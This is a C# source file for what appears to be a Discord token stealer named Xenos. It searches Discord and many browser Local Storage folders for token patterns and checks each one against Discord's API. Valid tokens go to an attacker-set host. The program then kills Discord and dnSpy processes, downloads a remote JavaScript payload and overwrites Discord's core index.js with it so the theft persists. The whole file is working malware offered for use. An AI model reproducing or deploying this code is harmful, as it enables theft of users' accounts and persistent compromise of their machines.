// Thanks to HideakiAtsuyo for the base
// Hideaki Repo: https://github.com/HideakiAtsuyo/XenosStub/blob/main/XenosStub/Program.cs

using System.Text.RegularExpressions;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.IO;
using System;

namespace Xenos
{
    internal class Program
    {
        public static string Host = "https://yourwebsite.com";

        internal static string LocalDirectory = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        internal static string RoamingDirectory = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

        internal static List<string> Tokens = new List<string>();
        internal static List<string> DiscordPath = new List<string>
        {
            $"{LocalDirectory}\\discord\\",
            $"{RoamingDirectory}\\Discord\\",
            $"{RoamingDirectory}\\Lightcord\\",
            $"{RoamingDirectory}\\discordptb\\",
            $"{RoamingDirectory}\\discordcanary\\",
        };

        internal static List<string> Paths = new List<string>()
        {
            String.Format("{0}/Discord/Local Storage/leveldb", RoamingDirectory),
            String.Format("{0}/Lightcord/Local Storage/leveldb", RoamingDirectory),
            String.Format("{0}/discordcanary/Local Storage/leveldb", RoamingDirectory),
            String.Format("{0}/discordptb/Local Storage/leveldb", RoamingDirectory),
            String.Format("{0}/OperaSoftware/Opera GX Stable/Local Storage/leveldb", RoamingDirectory),
            String.Format("{0}/OperaSoftware/Opera Stable/Local Storage/leveldb", RoamingDirectory),
            String.Format("{0}/Opera Software/Opera Neon/User Data/Default/Local Storage/leveldb", RoamingDirectory),
            String.Format("{0}/Google/Chrome/User Data/Default/Local Storage/leveldb", LocalDirectory),
            String.Format("{0}/Google/Chrome SxS/User Data/Local Storage/leveldb", LocalDirectory),
            String.Format("{0}/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb", LocalDirectory),
            String.Format("{0}/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb", LocalDirectory),
            String.Format("{0}/Amigo/User Data/Local Storage/leveldb", LocalDirectory),
            String.Format("{0}/Torch/User Data/Local Storage/leveldb", LocalDirectory),
            String.Format("{0}/Kometa/User Data/Local Storage/leveldb", LocalDirectory),
            String.Format("{0}/Orbitum/User Data/Local Storage/leveldb", LocalDirectory),
            String.Format("{0}/CentBrowser/User Data/Local Storage/leveldb", LocalDirectory),
            String.Format("{0}/7Star/7Star/User Data/Local Storage/leveldb", LocalDirectory),
            String.Format("{0}/Sputnik/Sputnik/User Data/Local Storage/leveldb", LocalDirectory),
            String.Format("{0}/Vivaldi/User Data/Default/Local Storage/leveldb", LocalDirectory),
            String.Format("{0}/EpicPrivacy Browser/User Data/Local Storage/leveldb", LocalDirectory),
            String.Format("{0}/Microsoft/Edge/User Data/Default/Local Storage/leveldb", LocalDirectory),
            String.Format("{0}/uCozMedia/Uran/User Data/Default/Local Storage/leveldb", LocalDirectory),
            String.Format("{0}/Iridium/User Data/Default/Local Storage/leveld", LocalDirectory),
        }, Regexs = new List<string>()
        {
            "[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}",
            "mfa\\.[\\w-]{84}"
        };

        static void Main(string[] args)
        {
            __StealTokens();            
            __SendTokens();            
            __KillInstances();
            __InjectPayload();
        }

        public static void __StealTokens()
        {
            foreach (var path in Paths)
            {
                if (Directory.Exists(path))
                {
                    foreach (var file in new DirectoryInfo(path).GetFiles())
                    {
                        try
                        {
                            foreach (string regex in Regexs)
                            {
                                foreach (Match match in Regex.Matches(file.OpenText().ReadToEnd(), regex))
                                {
                                    if (!Tokens.Contains(match.Value))
                                    {
                                        if (__CheckToken(match.Value))
                                        {
                                            Tokens.Add(match.Value);
                                        }
                                    }
                                }
                            }
                        } catch { }
                    }
                }
            }
        }

        public static void __KillInstances()
        {
            List<string> Instances = new List<string> { "DiscordDevelopment", "DiscordPTB", "Lightcord", "Discord", "discord", "dnspy" };
            Instances.ForEach(proc =>
            {
                foreach (var process in Process.GetProcessesByName(proc))
                {
                    try { process.Kill(); } catch { };
                }
            });
        }

        public static void __InjectPayload()
        {
            var Payload = new WebClient().DownloadString("https://raw.githubusercontent.com/KanekiWeb/Xenos/main/Grabber/Injection/injection.js");

            DiscordPath.ForEach(path =>
            {
                if (!Directory.Exists(path)) return;

                Directory.GetDirectories(path).Where(dir => dir.Contains("app-")).ToList<string>().ForEach(dirs =>
                {
                    Directory.GetDirectories(dirs).Where(dir => dir.Contains("module")).ToList<string>().ForEach(module_dirs =>
                    {
                        Directory.GetDirectories(module_dirs).Where(dir => dir.Contains("discord_desktop_core")).ToList<string>().ForEach(core =>
                        {
                            Directory.GetFiles(core, "*.*", SearchOption.AllDirectories).Where(s => s.ToLower().EndsWith("index.js")).ToList<string>().ForEach(file =>
                            {
                                try
                                {
                                    Directory.CreateDirectory(core + @"\discord_desktop_core\XenosStealer");
                                    File.WriteAllText(file, Payload.Replace("%WEBHOOK_LINK%", Host));
                                }
                                catch { };
                            });
                        });
                    });
                });
            });
        }

        public static bool __CheckToken(string token)
        {
            WebClient req = new WebClient();
            req.Headers.Add("Content-Type", "application/json");
            req.Headers.Add("Authorization", token);
            req.Headers.Add("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11");
            string resp = req.DownloadString("https://discordapp.com/api/v9/users/@me");

            if (resp.Contains("{\"id\": \"") || resp.Contains("\", \"username\": \"")) return true;
            else return false;
        }

        public static void __SendTokens()
        {
            Tokens.ForEach(token =>
            {
                try
                {
                    WebClient req = new WebClient();
                    req.DownloadString($"{Host}/api?type=addtoken&token={token}");
                } 
                catch { };
            });
        }
    }
}
